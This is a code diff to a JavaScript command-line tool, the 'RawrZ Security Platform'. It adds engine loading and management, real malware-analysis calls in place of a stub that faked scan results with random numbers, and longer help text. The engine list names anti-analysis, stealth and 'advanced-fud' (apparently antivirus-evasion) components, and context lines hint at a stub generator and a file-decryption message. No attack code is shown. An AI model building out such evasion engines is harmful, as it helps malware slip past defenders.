-                return `[OK] Malware Scan\n[INFO] Target: ${args[0] || 'unknown'}\n[INFO] Malware analysis complete\n[INFO] Suspicious files: ${Math.floor(Math.random() * 20)}\n[INFO] Malware detected: ${Math.floor(Math.random() * 5)}\n[INFO] Quarantine: ${Math.random() > 0.5 ? 'ENABLED' : 'DISABLED'}`;
+                try {
+                    const MalwareAnalysis = require('./src/engines/malware-analysis');
+                    const malwareAnalysis = new MalwareAnalysis();
+                    await malwareAnalysis.initialize();
+                    
+                    const target = args[0] || 'unknown';
+                    const staticAnalysis = await malwareAnalysis.performStaticAnalysis(target);
+                    const dynamicAnalysis = await malwareAnalysis.performDynamicAnalysis(target);
+                    const behavioralAnalysis = await malwareAnalysis.performBehavioralAnalysis(target);
+                    
+                    console.log(`[OK] Malware Scan`);
+                    console.log(`[INFO] Target: ${target}`);
+                    console.log(`[INFO] Static Analysis: ${staticAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    console.log(`[INFO] Dynamic Analysis: ${dynamicAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    console.log(`[INFO] Behavioral Analysis: ${behavioralAnalysis.success ? 'COMPLETE' : 'FAILED'}`);
+                    
+                    return { 
+                        success: true, 
+                        target: target,
+                        staticAnalysis: staticAnalysis,
+                        dynamicAnalysis: dynamicAnalysis,
+                        behavioralAnalysis: behavioralAnalysis
+                    };
+                } catch (error) {
+                    console.log(`[ERROR] Malware analysis failed: ${error.message}`);
+                    return { success: false, error: error.message };
+                }
 
             case 'status':
                 try {
@@ -2186,9 +2842,16 @@ echo "Use RawrZ decrypt command to decrypt this file"`;
         
         } catch (error) {
             this.errorCount++;
-            this.log('ERROR', `Command failed: ${command}`, { error: error.message, stack: error.stack });
+            this.log('ERROR', `Command failed: ${command}`, { 
+                error: error.message, 
+                stack: error.stack,
+                command: command,
+                args: commandArgs,
+                timestamp: new Date().toISOString()
+            });
             console.log(`[ERROR] Command execution failed: ${error.message}`);
-            throw error;
+            console.log(`[ERROR] Stack trace: ${error.stack}`);
+            return { success: false, error: error.message, stack: error.stack };
         }
     }
 
@@ -3534,6 +4197,124 @@ namespace RawrZStub
 }`;
     }
 
+    // Engine Management Methods
+    async listAvailableEngines() {
+        console.log('[OK] Available Engines:');
+        for (const [name, path] of Object.entries(this.availableEngines)) {
+            const status = this.loadedEngines.has(name) ? '[LOADED]' : '[NOT LOADED]';
+            console.log(`[INFO] ${name}: ${status}`);
+        }
+        return { success: true, engines: Object.keys(this.availableEngines) };
+    }
+
+    async loadEngine(engineName) {
+        try {
+            if (this.loadedEngines.has(engineName)) {
+                console.log(`[WARN] Engine ${engineName} is already loaded`);
+                return { success: true, message: `Engine ${engineName} already loaded` };
+            }
+
+            if (!this.availableEngines[engineName]) {
+                console.log(`[ERROR] Engine ${engineName} not found`);
+                return { success: false, error: `Engine ${engineName} not found` };
+            }
+
+            const EngineModule = require(this.availableEngines[engineName]);
+            const engine = typeof EngineModule === 'function' ? new EngineModule() : EngineModule;
+            
+            if (typeof engine.initialize === 'function') {
+                await engine.initialize();
+            }
+            
+            this.loadedEngines.set(engineName, engine);
+            console.log(`[OK] Engine ${engineName} loaded successfully`);
+            
+            // Save state after successful load
+            await this.saveEngineState();
+            
+            return { success: true, message: `Engine ${engineName} loaded successfully` };
+        } catch (error) {
+            console.log(`[ERROR] Failed to load engine ${engineName}: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    async unloadEngine(engineName) {
+        try {
+            if (!this.loadedEngines.has(engineName)) {
+                console.log(`[WARN] Engine ${engineName} is not loaded`);
+                return { success: true, message: `Engine ${engineName} not loaded` };
+            }
+
+            const engine = this.loadedEngines.get(engineName);
+            if (typeof engine.shutdown === 'function') {
+                await engine.shutdown();
+            }
+            
+            this.loadedEngines.delete(engineName);
+            console.log(`[OK] Engine ${engineName} unloaded successfully`);
+            
+            // Save state after successful unload
+            await this.saveEngineState();
+            
+            return { success: true, message: `Engine ${engineName} unloaded successfully` };
+        } catch (error) {
+            console.log(`[ERROR] Failed to unload engine ${engineName}: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
+    async listLoadedEngines() {
+        console.log('[OK] Loaded Engines:');
+        if (this.loadedEngines.size === 0) {
+            console.log('[INFO] No engines loaded');
+            return { success: true, engines: [] };
+        }
+        
+        for (const [name, engine] of this.loadedEngines) {
+            console.log(`[INFO] ${name}: [LOADED]`);
+        }
+        return { success: true, engines: Array.from(this.loadedEngines.keys()) };
+    }
+
+    async useEngine(engineName, commandArgs) {
+        try {
+            if (!this.loadedEngines.has(engineName)) {
+                console.log(`[ERROR] Engine ${engineName} is not loaded. Use 'load ${engineName}' first.`);
+                return { success: false, error: `Engine ${engineName} not loaded` };
+            }
+
+            const engine = this.loadedEngines.get(engineName);
+            const command = commandArgs[0];
+            const args = commandArgs.slice(1);
+
+            if (typeof engine[command] !== 'function') {
+                console.log(`[ERROR] Command ${command} not found in engine ${engineName}`);
+                return { success: false, error: `Command ${command} not found` };
+            }
+
+            console.log(`[OK] Executing ${command} on engine ${engineName}`);
+            const result = await engine[command](...args);
+            
+            if (result && typeof result === 'object') {
+                console.log(`[OK] Command executed successfully`);
+                if (result.success !== undefined) {
+                    console.log(`[INFO] Success: ${result.success}`);
+                }
+                if (result.message) {
+                    console.log(`[INFO] Message: ${result.message}`);
+                }
+            } else {
+                console.log(`[OK] Command executed successfully`);
+            }
+            
+            return { success: true, result: result };
+        } catch (error) {
+            console.log(`[ERROR] Failed to execute command on engine ${engineName}: ${error.message}`);
+            return { success: false, error: error.message };
+        }
+    }
+
     showHelp() {
         console.log('=================================================');
         console.log('RawrZ Security Platform - Complete Standalone CLI');
@@ -3583,6 +4364,19 @@ namespace RawrZStub
         console.log('  dns <hostname> - DNS lookup');
         console.log('  portscan <host> [startport] [endport] - Port scan');
         console.log('  traceroute <host> - Trace network route');
+        console.log('');
+        console.log('[ENGINE MANAGEMENT]');
+        console.log('  engines <load|unload|list|status> [engineName] - Manage engines');
+        console.log('  use <engine> <command> [args]  - Use engine command');
+        console.log('  rebuild                        - Rebuild platform state');
+        console.log('  session <create|restore|list|delete> [sessionId] - Session management');
+        console.log('');
+        console.log('Available Engines:');
+        console.log('  anti-analysis, digital-forensics, malware-analysis');
+        console.log('  network-tools, hot-patchers, reverse-engineering');
+        console.log('  jotti-scanner, private-virus-scanner, camellia-assembly');
+        console.log('  dual-generators, health-monitor, stealth-engine');
+        console.log('  advanced-fud-engine');
         console.log('  whois <domain> - WHOIS domain lookup');
         console.log('');
         console.log('[FILE OPERATIONS]');
@@ -3630,13 +4424,14 @@ namespace RawrZStub
 async function main() {
     const args = process.argv.slice(2);
     
+    // Use singleton pattern to maintain engine state across commands
+    const rawrz = RawrZStandalone.getInstance();
+    
     if (args.length === 0) {
-        const rawrz = new RawrZStandalone();
         rawrz.showHelp();
         return;
     }
     
-    const rawrz = new RawrZStandalone();
     await rawrz.processCommand(args);
 }
 
